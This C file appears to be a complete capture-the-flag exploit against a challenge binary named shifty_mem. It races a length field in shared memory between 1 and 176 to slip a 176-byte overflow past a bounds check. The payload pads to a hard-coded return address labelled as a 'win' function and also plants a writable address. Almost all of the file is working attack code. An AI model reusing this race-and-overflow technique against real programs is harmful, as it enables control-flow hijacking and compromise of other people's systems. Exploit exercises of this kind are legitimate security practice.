#include <stdio.h>
#include <stdlib.h>
#include <signal.h>
#include <string.h>
#include <errno.h>
#include <sys/mman.h>
#include <sys/stat.h>
#include <sys/wait.h>
#include <fcntl.h>
#include <unistd.h>

#define MAX_STR_LEN 128

typedef struct req {
    unsigned char len;
    char shift;
    char buf[MAX_STR_LEN];
} shm_req_t;
shm_req_t* shm_req;

void err_exit(int pid, char* msg) {
    usleep(10000);
    kill(pid, SIGKILL);
    wait(NULL);
    fprintf(stderr, msg);
    exit(1);
}

void exploit(int pid) {
    usleep(5000);

    int fd = shm_open("hax", O_RDWR, S_IRWXG);
    if(fd == -1) {
        err_exit(pid, "shm_open error");
        return;
    }

    shm_req = mmap(NULL, 0x1000, PROT_READ | PROT_WRITE, MAP_SHARED, fd, 0);
    if(shm_req == MAP_FAILED) {
        err_exit(pid, "mmap error");
        return;
    }

    close(fd);
    shm_unlink("hax");

    shm_req->len = -1;
    shm_req->shift = 0;

    // payload (padding + addr of win)
    char payload[176] = "aaaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaagaaaaaaahaaaaaaaiaaaaaaajaaaaaaakaaaaaaalaaaaaaamaaaaaaanaaaaaaaoaaaaaaapaaaaaaaqaaaaaaaraaaaaaasaaaaaaataaaaaaauaaaaaaaL\x12@\x00\x00\x00\x00\x00";
    for(int i = 0; i < 176; i++) {
        shm_req->buf[i] = payload[i];
    }
    // just needs to be writable
    *((unsigned long*)(&shm_req->buf[136])) = 0x404800;

    while(1) {
        shm_req->len = 1;
        shm_req->len = 176;
    }
}

int main() {
    int pid;
    if((pid = fork()) == 0) {
        char* args[] = {"/home/ctf/chal/shifty_mem", "hax", NULL};
        execve(args[0], args, NULL);
    } else {
        exploit(pid);
    }
}
